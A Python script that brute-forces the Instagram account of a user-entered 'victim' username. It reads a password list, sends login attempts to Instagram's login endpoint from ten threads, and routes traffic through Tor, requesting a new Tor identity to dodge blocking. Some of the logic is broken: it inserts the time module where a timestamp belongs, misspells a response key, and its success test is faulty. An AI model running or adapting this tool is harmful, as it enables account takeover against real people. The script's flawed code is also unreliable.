#!/usr/bin/env python3 

import requests
import time 
import json
from stem import Signal
from stem.control import Controller
import hashlib
import threading 

#GLOBAL CONSTANTS
username = input("Enter Victim Username >> ")
tor_password = input("Enter Tor Password >> ")
LIST = input("Enter List Path >> ")
k =  0 

def tor_session():
    session = requests.session()
    session.proxies = { 'http' : 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050' }
    return session 

def renew_connection():
    with Controller.from_port(port = 9051 ) as controller:
        controller.authenticate(password = tor_password)
        controller.signal(Signal.NEWNYM)

def lists(w):
    with open (w , "r") as f :
        lst = f.read().split("\n")
    return lst

def login(password,session):
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    print("Using the password > ",password )

    base_url = "https://www.instagram.com"
    login_url = f"{base_url}/accounts/login/ajax/"
    response_csrf = session.get(base_url)
    csrf = response_csrf.cookies["csrftoken"]
    
    payload = {
    'username' : username ,
    'enc_password' : f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password_hash}',
    'queryParams' : {},
    'optIntoOneTap':'false',
    'trustedDeviceRecords':{} }
    
    login_headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "X-Requested-With":"XMLHttpRequest",
    "Referer" : f"{base_url}/accounts/login/",
    "x-csrftoken" : csrf }

    try:
        response = session.post(login_url , data = payload , headers = login_headers )
        print(response)
        json_res = json.loads(response.text)
        print(json_res)
        if "authenticated" in json_res == True and json_res['auntheticated'] == True:
            return 1
        else:
            return 0
    except Exception as e:
        return 2

def main(password_lst):
    session = tor_session()
    for password in password_lst:
        login_data = login(password,session)
        if login_data == 2:
            renew_connection()
            if login(password,session) == 0:
                print(f"Login failed with {password}")
            elif login(password,session) == 1:
                print(f"Login Sucessfull with {password}")
            else:
                print(f"{password} was tried 2 times but no json response was got !")
                continue        
        elif login_data == 0:
            print(f"Login Failed with {password}")
        else:
            print(f"Login Sucessfull with {password}")
            break

if __name__ == "__main__" :
    threads = []
    start , end = 0 , 10
    
    for i in range(10):
        passcode = lists(LIST)
        password_lst = passcode[start:end]
        start , end = start + 10 , end + 10
        t = threading.Thread(target = main , args = (password_lst, ) , daemon = False)
        threads.append(t)

    for i in range(10):
        threads[i].start()

    for i in range(10):
        threads[i].join()
